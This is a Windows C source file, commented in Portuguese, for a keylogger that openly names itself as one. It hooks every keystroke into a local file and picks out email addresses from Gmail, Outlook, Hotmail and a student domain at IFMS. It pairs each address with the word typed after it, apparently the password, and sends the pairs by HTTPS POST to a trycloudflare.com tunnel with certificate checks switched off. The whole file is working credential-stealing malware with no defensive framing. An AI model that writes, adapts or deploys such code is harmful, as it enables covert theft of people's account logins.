#include <windows.h>
#include <stdio.h>
#include <stdlib.h>
#include <locale.h>
#include <wctype.h>
#include <wchar.h>
#include <string.h>
#include <winhttp.h>

#pragma comment(lib, "winhttp.lib")

HHOOK hKeyboardHook;

// Configuração do servidor
#define SERVER_HOST L"requiring-edward-human-scale.trycloudflare.com"
#define SERVER_PORT 443  // HTTPS usa porta 443
#define SERVER_PATH L"/envio"
#define USE_HTTPS 1      // 1 para HTTPS, 0 para HTTP

// Estrutura para tracking de linhas enviadas
typedef struct LinhaEnviada {
    wchar_t* texto;
    struct LinhaEnviada* prox;
} LinhaEnviada;

LinhaEnviada* linhasEnviadas = NULL;
CRITICAL_SECTION csLinhasEnviadas;

// Função para verificar se linha já foi enviada
int linhaJaEnviada(const wchar_t* linha) {
    EnterCriticalSection(&csLinhasEnviadas);

    LinhaEnviada* atual = linhasEnviadas;
    while (atual != NULL) {
        if (wcscmp(atual->texto, linha) == 0) {
            LeaveCriticalSection(&csLinhasEnviadas);
            return 1;
        }
        atual = atual->prox;
    }

    LeaveCriticalSection(&csLinhasEnviadas);
    return 0;
}

// Função para adicionar linha ao tracking
void adicionarLinhaEnviada(const wchar_t* linha) {
    EnterCriticalSection(&csLinhasEnviadas);

    LinhaEnviada* nova = (LinhaEnviada*)malloc(sizeof(LinhaEnviada));
    if (nova != NULL) {
        nova->texto = (wchar_t*)malloc((wcslen(linha) + 1) * sizeof(wchar_t));
        if (nova->texto != NULL) {
            wcscpy(nova->texto, linha);
            nova->prox = linhasEnviadas;
            linhasEnviadas = nova;
        } else {
            free(nova);
        }
    }

    LeaveCriticalSection(&csLinhasEnviadas);
}

// Função para enviar dados via HTTP/HTTPS POST
int enviarViaHTTP(const char* dados) {
    HINTERNET hSession = NULL;
    HINTERNET hConnect = NULL;
    HINTERNET hRequest = NULL;
    BOOL bResults = FALSE;

    // Configurações para HTTPS
    DWORD dwFlags = WINHTTP_ACCESS_TYPE_DEFAULT_PROXY;
    
    // Inicializar WinHTTP
    hSession = WinHttpOpen(L"KeyLogger/1.0", dwFlags,
                          WINHTTP_NO_PROXY_NAME,
                          WINHTTP_NO_PROXY_BYPASS, 0);

    if (hSession) {
        // Configurar opções para HTTPS
        if (USE_HTTPS) {
            // Ignorar erros de certificado (para desenvolvimento)
            DWORD dwSecurityFlags = 
                SECURITY_FLAG_IGNORE_UNKNOWN_CA |
                SECURITY_FLAG_IGNORE_CERT_CN_INVALID |
                SECURITY_FLAG_IGNORE_CERT_DATE_INVALID |
                SECURITY_FLAG_IGNORE_CERT_WRONG_USAGE;
            
            WinHttpSetOption(hSession, WINHTTP_OPTION_SECURITY_FLAGS, 
                           &dwSecurityFlags, sizeof(dwSecurityFlags));
        }
        
        // Conectar ao servidor
        hConnect = WinHttpConnect(hSession, SERVER_HOST, SERVER_PORT, 0);

        if (hConnect) {
            // Criar request POST
            hRequest = WinHttpOpenRequest(hConnect, L"POST", SERVER_PATH,
                                         NULL, NULL, NULL, 
                                         USE_HTTPS ? WINHTTP_FLAG_SECURE : 0);

            if (hRequest) {
                // Configurar headers
                LPCWSTR headers = L"Content-Type: application/json\r\n";

                // Preparar body JSON
                char body[2048];
                // Escapar caracteres especiais no JSON
                char escaped_dados[1024];
                int j = 0;
                for (int i = 0; dados[i] != '\0' && j < sizeof(escaped_dados) - 1; i++) {
                    if (dados[i] == '"' || dados[i] == '\\') {
                        escaped_dados[j++] = '\\';
                    }
                    escaped_dados[j++] = dados[i];
                }
                escaped_dados[j] = '\0';
                
                snprintf(body, sizeof(body), "{\"texto\":\"%s\"}", escaped_dados);

                // Enviar request
                bResults = WinHttpSendRequest(hRequest, headers, wcslen(headers),
                                            (LPVOID)body, strlen(body),
                                            strlen(body), 0);

                if (bResults) {
                    bResults = WinHttpReceiveResponse(hRequest, NULL);
                    
                    // Verificar resposta
                    if (bResults) {
                        DWORD dwStatusCode = 0;
                        DWORD dwSize = sizeof(dwStatusCode);
                        WinHttpQueryHeaders(hRequest, 
                                          WINHTTP_QUERY_STATUS_CODE | WINHTTP_QUERY_FLAG_NUMBER,
                                          WINHTTP_HEADER_NAME_BY_INDEX,
                                          &dwStatusCode, &dwSize,
                                          WINHTTP_NO_HEADER_INDEX);
                        
                        if (dwStatusCode == 200) {
                            printf("HTTP %d - OK\n", dwStatusCode);
                        } else {
                            printf("HTTP Status: %d\n", dwStatusCode);
                        }
                    }
                }

                WinHttpCloseHandle(hRequest);
            }
            WinHttpCloseHandle(hConnect);
        }
        WinHttpCloseHandle(hSession);
    }

    return bResults ? 0 : -1;
}

// Função para converter wchar_t para char (UTF-8)
char* wcharToUTF8(const wchar_t* wstr) {
    if (wstr == NULL) return NULL;

    int size_needed = WideCharToMultiByte(CP_UTF8, 0, wstr, -1, NULL, 0, NULL, NULL);
    char* utf8_str = (char*)malloc(size_needed);

    if (utf8_str) {
        WideCharToMultiByte(CP_UTF8, 0, wstr, -1, utf8_str, size_needed, NULL, NULL);
    }

    return utf8_str;
}

// Função auxiliar para resolver o problema de Dead Keys (Acentos) no Windows
int GetUnicodeCharFromHook(KBDLLHOOKSTRUCT *pKeyBoard, WCHAR *buffer) {
    BYTE keystate[256] = {0};

    if (GetAsyncKeyState(VK_SHIFT) & 0x8000)
        keystate[VK_SHIFT] = 0x80;

    if (GetKeyState(VK_CAPITAL) & 0x0001)
        keystate[VK_CAPITAL] = 0x01;

    if (GetAsyncKeyState(VK_MENU) & 0x8000)
        keystate[VK_MENU] = 0x80;

    if (GetAsyncKeyState(VK_CONTROL) & 0x8000)
        keystate[VK_CONTROL] = 0x80;

    DWORD threadId = GetWindowThreadProcessId(GetForegroundWindow(), NULL);
    HKL layout = GetKeyboardLayout(threadId);

    int result = ToUnicodeEx(pKeyBoard->vkCode, pKeyBoard->scanCode, keystate, buffer, 5, 0, layout);

    // limpa dead key
    if (result == -1) {
        WCHAR tempBuf[5];
        ToUnicodeEx(VK_SPACE, MapVirtualKeyW(VK_SPACE, MAPVK_VK_TO_VSC), keystate, tempBuf, 5, 0, layout);
    }

    return result;
}

// Função para processar e enviar novas linhas
void ProcessarEEnviarLinhas(const wchar_t* conteudo) {
    if (conteudo == NULL) return;

    wchar_t* buffer = (wchar_t*)malloc((wcslen(conteudo) + 1) * sizeof(wchar_t));
    if (buffer == NULL) return;

    wcscpy(buffer, conteudo);
    wchar_t* p = buffer;

    while (*p != L'\0') {
        // Encontrar início da linha
        while (*p == L'\n' || *p == L'\r') p++;
        if (*p == L'\0') break;

        wchar_t* inicioLinha = p;

        // Encontrar fim da linha
        while (*p != L'\0' && *p != L'\n' && *p != L'\r') p++;
        wchar_t* fimLinha = p;

        size_t len = fimLinha - inicioLinha;
        if (len > 0) {
            wchar_t* linha = (wchar_t*)malloc((len + 1) * sizeof(wchar_t));
            if (linha != NULL) {
                wcsncpy(linha, inicioLinha, len);
                linha[len] = L'\0';

                // Verificar se linha contém formato esperado
                if (wcsstr(linha, L"][") != NULL && wcsstr(linha, L"@") != NULL) {
                    if (!linhaJaEnviada(linha)) {
                        // Converter para UTF-8 e enviar
                        char* linhaUTF8 = wcharToUTF8(linha);
                        if (linhaUTF8 != NULL) {
                            printf("Enviando: %ls\n", linha);
                            int resultado = enviarViaHTTP(linhaUTF8);
                            if (resultado == 0) {
                                adicionarLinhaEnviada(linha);
                                printf("Envio bem sucedido!\n");
                            } else {
                                printf("Falha no envio!\n");
                            }
                            free(linhaUTF8);
                        }
                    } else {
                        printf("Linha já enviada: %ls\n", linha);
                    }
                }
                free(linha);
            }
        }
    }

    free(buffer);
}

// Atualiza dados_filtrados.txt e processa envio
void AtualizarArquivoFiltrado() {
    FILE *arqvOrigem = _wfopen(L"dados.txt", L"r, ccs=UTF-8");
    if (arqvOrigem == NULL) return;

    size_t bufSize = 65536;
    wchar_t *conteudo = (wchar_t *)malloc(bufSize * sizeof(wchar_t));

    if (conteudo == NULL) {
        fclose(arqvOrigem);
        return;
    }

    size_t totalLidos = 0;
    wchar_t ch;

    while ((ch = fgetwc(arqvOrigem)) != WEOF && totalLidos < bufSize - 1) {
        conteudo[totalLidos++] = ch;
    }
    conteudo[totalLidos] = L'\0';
    fclose(arqvOrigem);

    FILE *arqvDestino = _wfopen(L"dados_filtrados.txt", L"w, ccs=UTF-8");
    if (arqvDestino == NULL) {
        free(conteudo);
        return;
    }

    wchar_t *p = conteudo;
    wchar_t* linhasParaEnviar = (wchar_t*)calloc(bufSize, sizeof(wchar_t));
    size_t linhasPos = 0;

    while (*p != L'\0') {
        // pula espaços
        while (*p == L' ' || *p == L'\n' || *p == L'\r' || *p == L'\t') {
            p++;
        }

        if (*p == L'\0') break;

        // início da primeira palavra
        wchar_t *inicio1 = p;
        while (*p != L'\0' && *p != L' ' && *p != L'\n' && *p != L'\r' && *p != L'\t') {
            p++;
        }

        wchar_t *fim1 = p;
        size_t len1 = fim1 - inicio1;

        // copia palavra atual
        wchar_t palavra1[512];
        wcsncpy(palavra1, inicio1, len1);
        palavra1[len1] = L'\0';

        if (palavra1[0] == L't') {
            memmove(palavra1, palavra1 + 1, wcslen(palavra1) * sizeof(wchar_t));
        }

        // verifica se contém '@'
        if (wcsstr(palavra1, L"@gmail.com") != NULL ||
            wcsstr(palavra1, L"@estudante.ifms.edu.br") != NULL ||
            wcsstr(palavra1, L"@outlook.com") != NULL ||
            wcsstr(palavra1, L"@hotmail.com") != NULL) {

            // pula separadores
            while (*p == L' ' || *p == L'\n' || *p == L'\r' || *p == L'\t') {
                p++;
            }

            // existe próxima palavra?
            if (*p != L'\0') {
                wchar_t *inicio2 = p;
                while (*p != L'\0' && *p != L' ' && *p != L'\n' && *p != L'\r' && *p != L'\t') {
                    p++;
                }

                wchar_t *fim2 = p;
                size_t len2 = fim2 - inicio2;

                // Escrever no arquivo filtrado
                fwprintf(arqvDestino, L"[%ls][%.*ls]\n", palavra1, (int)len2, inicio2);

                // Adicionar à lista para envio
                linhasPos += swprintf(linhasParaEnviar + linhasPos, bufSize - linhasPos, L"[%ls][%.*ls]\n", palavra1, (int)len2, inicio2);
            }
        }
    }

    fclose(arqvDestino);

    // Processar e enviar novas linhas
    if (linhasPos > 0) {
        ProcessarEEnviarLinhas(linhasParaEnviar);
    }

    free(linhasParaEnviar);
    free(conteudo);
}

LRESULT CALLBACK KeyboardProc(int nCode, WPARAM wParam, LPARAM lParam) {
    if (nCode >= 0 && (wParam == WM_KEYDOWN || wParam == WM_SYSKEYDOWN)) {
        KBDLLHOOKSTRUCT *pKeyBoard = (KBDLLHOOKSTRUCT *)lParam;
        DWORD vkCode = pKeyBoard->vkCode;

        // BACKSPACE
        if (vkCode == VK_BACK) {
            FILE *arquivoLeitura = _wfopen(L"dados.txt", L"r, ccs=UTF-8");
            if (arquivoLeitura != NULL) {
                size_t bufferSize = 65536;
                wchar_t *texto = (wchar_t *)malloc(bufferSize * sizeof(wchar_t));
                size_t totalLidos = 0;
                wchar_t ch;

                while ((ch = fgetwc(arquivoLeitura)) != WEOF && totalLidos < bufferSize - 1) {
                    texto[totalLidos++] = ch;
                }
                texto[totalLidos] = L'\0';
                fclose(arquivoLeitura);

                if (totalLidos > 0) {
                    texto[totalLidos - 1] = L'\0';
                    FILE *arquivoEscrita = _wfopen(L"dados.txt", L"w, ccs=UTF-8");
                    if (arquivoEscrita != NULL) {
                        fputws(texto, arquivoEscrita);
                        fclose(arquivoEscrita);
                    }
                }
                free(texto);
            }
            AtualizarArquivoFiltrado();
            return CallNextHookEx(hKeyboardHook, nCode, wParam, lParam);
        }

        // OUTROS CARACTERES
        WCHAR unicodeBuffer[5] = {0};
        int translationResult = GetUnicodeCharFromHook(pKeyBoard, unicodeBuffer);

        FILE *arquivo = _wfopen(L"dados.txt", L"a, ccs=UTF-8");
        if (arquivo != NULL) {
            if (translationResult > 0) {
                for (int i = 0; i < translationResult; i++) {
                    if (unicodeBuffer[i] >= 32 || unicodeBuffer[i] == L'\n' || unicodeBuffer[i] == L'\r') {
                        fputwc(unicodeBuffer[i], arquivo);
                    }
                }
            }
            else if (translationResult == 0) {
                if (vkCode == VK_RETURN) {
                    fwprintf(arquivo, L"\n");
                }
                else if (vkCode == VK_TAB) {
                    fwprintf(arquivo, L"\t");
                }
            }
            fclose(arquivo);
            AtualizarArquivoFiltrado();
        }
    }

    return CallNextHookEx(hKeyboardHook, nCode, wParam, lParam);
}

int main() {
    setlocale(LC_ALL, "");
    InitializeCriticalSection(&csLinhasEnviadas);

    hKeyboardHook = SetWindowsHookEx(WH_KEYBOARD_LL, KeyboardProc, NULL, 0);

    if (hKeyboardHook == NULL) {
        printf("Erro ao instalar o hook! Erro: %d\n", GetLastError());
        DeleteCriticalSection(&csLinhasEnviadas);
        return 1;
    }

    printf("========================================\n");
    printf("KEYLOGGER COM ENVIO HTTPS\n");
    printf("========================================\n");
    printf("Servidor: %S\n", SERVER_HOST);
    printf("Porta: %d (%s)\n", SERVER_PORT, USE_HTTPS ? "HTTPS" : "HTTP");
    printf("Caminho: %S\n", SERVER_PATH);
    printf("dados.txt -> bruto\n");
    printf("dados_filtrados.txt -> filtrado\n");
    printf("========================================\n\n");

    MSG msg;
    while (GetMessage(&msg, NULL, 0, 0)) {
        TranslateMessage(&msg);
        DispatchMessage(&msg);
    }

    UnhookWindowsHookEx(hKeyboardHook);

    // Limpar lista de linhas enviadas
    LinhaEnviada* atual = linhasEnviadas;
    while (atual != NULL) {
        LinhaEnviada* prox = atual->prox;
        free(atual->texto);
        free(atual);
        atual = prox;
    }

    DeleteCriticalSection(&csLinhasEnviadas);

    return 0;
}
